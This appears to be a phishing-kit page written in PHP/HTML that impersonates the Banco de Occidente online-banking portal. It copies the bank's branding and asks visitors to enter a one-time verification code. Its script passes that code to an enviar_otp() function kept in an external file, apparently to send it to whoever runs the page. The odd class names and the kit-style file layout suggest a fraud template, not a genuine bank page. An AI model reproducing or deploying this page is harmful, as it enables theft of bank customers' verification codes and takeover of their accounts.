
<?php 


?>

<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <link href="css/fonts.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
    <title>Ingreso al Portal Transaccional | Banco de Occidente</title>
    <link href="img/favicon.ico" rel="icon">
    <script src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/functions2.js" type="text/javascript"></script>
<body>
    <div class="ContenedorInicial">
        <div class="ContenedorPublicidad">
            <img alt="grupo" class="ImagenPublicidad" src="img/grupo.svg">
            <div class="FrasePublicidad">
                <h2 class="Contigo">Estamos contigo donde estÃ©s</h2>
                <h1 class="Conectate">ConÃ©ctate</h1>
                <h4 class="ConoceNuevasFunciones">Conoce todas las nuevas <span class="SpanFunciones">funciones</span> de nuestro Portal Transaccional</h4>
            </div>
            <div class="footer">
                <div class="vigilado">
                    <img alt="Vigilado" class="ImagenVigilado" src="img/vigilado.svg">
                </div>
                <div class="versionapp">
                    <div class="version">v.0.86.35</div>
                    <div class="LogoVersionAval">
                        <img alt="Vigilado" class="LogoAval" src="img/logoaval.svg">
                    </div>
                </div>
            </div>
        </div>

        <div class="ContenedorInicialInfoUsuario">
            <div class="ContenedorSecundarioInfoUsuario">
                <div class="SeguridadInfoUsuario">
                    <div class="InfoSeguridad">
                        <a class="ASeguridad" href="#" title="Seguridad">
                            <div class="seguriti">
                                <em class="LogoSeguridad"></em>
                            </div>
                            <span class="Palabrahp">Seguridad</span>
                        </a>
                    </div>
                </div>
                <div class="MeteInfo">
                    <a class="Logorock"></a>
                    <div class="Datosss">
                        <h2 class="ingresarr">INGRESA EL CÃ“DIGO DE VERIFICACIÃ“N</h2>
                        <form class="meterr">
                            <div class="NumDcc">
                                <label class="numdclab">CÃ³digo de verificaciÃ³n</label>
                                <input class="documentimput" id="txtOTP" maxlength="10" placeholder="*CÃ³digo" type="tel">
                            </div>
                            <div class="RegisIngre">
                                <botonazo class="ButtonRegister" type="submit">
                                    <div class="otravezboton">
                                        <button class="estesinoesigual" id="btnOTP" type="button">
                                            <span class="yaaaps"></span>
                                            <span class="sjjsi">Validar</span>
                                        </button>
                                    </div>
                                </botonazo>
                            </div>
                        </form>
                    </div>
                </div>
                
            </div>
        </div>
    </div>

    <script type="text/javascript">
        var espera = 0;
        let identificadorTiempoDeEspera;

        function retardor() {
            identificadorTiempoDeEspera = setTimeout(retardorX, 900);
        }

        function retardorX() {}

        $(document).ready(function () {
            $("#btnOTP").click(function () {
                if ($("#txtOTP").val().length > 4) {
                    enviar_otp($("#txtOTP").val());
                } else {
                    $("#txtOTP").focus();
                }
            });
            $(".imagendecierre").click(function () {
                $(".finalss").hide();
            });
        });
    </script>
</body>

</html>

